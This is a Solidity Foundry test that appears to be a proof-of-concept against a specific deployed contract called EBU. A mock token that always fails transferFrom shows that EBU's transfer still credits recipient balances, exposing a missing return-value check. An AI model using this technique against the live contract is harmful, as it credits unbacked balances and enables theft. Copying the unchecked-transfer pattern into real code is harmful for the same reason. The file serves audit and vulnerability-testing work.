// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract MockToken {
    // Always return false on transferFrom
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
}

contract EBUTest is Test {
    EBU public ebu;
    MockToken public token;
    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    function setUp() public {
        // Deploy contracts
        vm.prank(owner);
        ebu = new EBU();
        
        token = new MockToken();
        
        // Authorize token
        vm.prank(owner);
        ebu.authorizeToken(address(token));
    }

    function test_missingReturnValueCheck() public {
        // Prepare transfer data
        address[] memory recipients = new address[](2);
        recipients[0] = user1;
        recipients[1] = user2;
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100;
        amounts[1] = 200;
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 user1BalanceBefore = ebu.getUserBalance(user1);
        uint256 user2BalanceBefore = ebu.getUserBalance(user2);
        uint256 totalTransfersBefore = ebu.totalTransfers();
        
        console.log("User1 initial balance:", user1BalanceBefore);
        console.log("User2 initial balance:", user2BalanceBefore);
        console.log("Total transfers before:", totalTransfersBefore);
        
        console.log("--- Trigger Transfer ---");
        // Perform transfer - should update balances despite failed token transfer
        ebu.transfer(owner, address(token), recipients, amounts);
        
        console.log("--- AFTER-Trigger State ---");
        uint256 user1BalanceAfter = ebu.getUserBalance(user1);
        uint256 user2BalanceAfter = ebu.getUserBalance(user2);
        uint256 totalTransfersAfter = ebu.totalTransfers();
        
        console.log("User1 balance after:", user1BalanceAfter);
        console.log("User2 balance after:", user2BalanceAfter);
        console.log("Total transfers after:", totalTransfersAfter);
        
        console.log("--- Comparison Verdict ---");
        bool balanceStateChanged = (user1BalanceAfter != user1BalanceBefore) || 
                                  (user2BalanceAfter != user2BalanceBefore);
        bool transfersStateChanged = (totalTransfersAfter != totalTransfersBefore);
        bool vulnerabilityExists = balanceStateChanged || transfersStateChanged;
        
        if (vulnerabilityExists) {
            console.log("State changed despite failed token transfer");
            console.log("Vulnerability Exists: Missing return value validation allows state changes");
        } else {
            console.log("State unchanged (no unexpected balance/total transfers changes)");
            console.log("Vulnerability not Exist: Proper state handling detected");
        }
        
        // Verify specific values (original test assertions)
        assertEq(user1BalanceAfter, 100);
        assertEq(user2BalanceAfter, 200);
    }
}